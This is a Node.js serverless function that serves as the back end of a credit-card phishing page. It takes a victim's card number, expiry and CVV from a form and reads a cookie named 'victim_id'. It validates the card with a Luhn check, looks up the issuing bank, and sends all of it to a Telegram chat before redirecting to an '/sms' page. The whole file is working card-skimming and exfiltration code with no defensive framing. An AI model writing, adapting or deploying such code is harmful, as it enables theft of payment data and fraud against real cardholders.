const fetch = require('node-fetch');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendTelegram(message) {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.log('[TELEGRAM NOT CONFIGURED] Would send:', message);
    return;
  }
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    console.log('Telegram message sent');
  } catch (err) {
    console.error('Telegram error:', err);
  }
}

async function getBinInfo(bin) {
  try {
    const response = await fetch(`https://data.handyapi.com/bin/${bin}`);
    if (response.ok) {
      const data = await response.json();
      if (data.Status === 'SUCCESS') {
        return {
          scheme: data.Scheme || 'Unknown',
          type: data.Type || 'Unknown',
          brand: data.CardTier || 'Unknown',
          bank: data.Issuer || 'Unknown',
          country: data.Country ? data.Country.Name : 'Unknown'
        };
      }
    }
  } catch (e) {
    console.error('BIN lookup error:', e);
  }
  return null;
}

function luhnCheck(num) {
  let digits = num.replace(/\D/g, '');
  if (digits.length < 13) return false;
  let sum = 0, alt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i], 10);
    if (alt) { n *= 2; if (n > 9) n -= 9; }
    sum += n; alt = !alt;
  }
  return sum % 10 === 0;
}

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const params = new URLSearchParams(event.body);
    const card_number = params.get('card_number');
    const card_expiry = params.get('card_expiry');
    const card_cvv = params.get('card_cvv');
    const vId = event.headers.cookie?.match(/victim_id=([^;]+)/)?.[1] || 'unknown';

    if (!luhnCheck(card_number)) {
      return { statusCode: 400, body: 'Invalid card number' };
    }

    let binInfo = null;
    const binStr = card_number.replace(/\D/g, '').substring(0, 6);
    if (binStr.length >= 6) binInfo = await getBinInfo(binStr);

    let msg = `<b>💳 Card</b>\n<b>Number:</b> <code>${card_number}</code>\n<b>Expiry:</b> <code>${card_expiry}</code>\n<b>CVV:</b> <code>${card_cvv}</code>\n<b>ID:</b> <code>${vId}</code>`;
    if (binInfo) msg += `\n\n<b>🏦 BIN:</b> ${binInfo.bank} | ${binInfo.brand} | ${binInfo.type} | ${binInfo.country}`;

    await sendTelegram(msg);

    return {
      statusCode: 302,
      headers: {
        'Location': '/sms'
      },
      body: ''
    };
  } catch (error) {
    console.error('Error:', error);
    return { statusCode: 500, body: 'Internal Server Error' };
  }
};
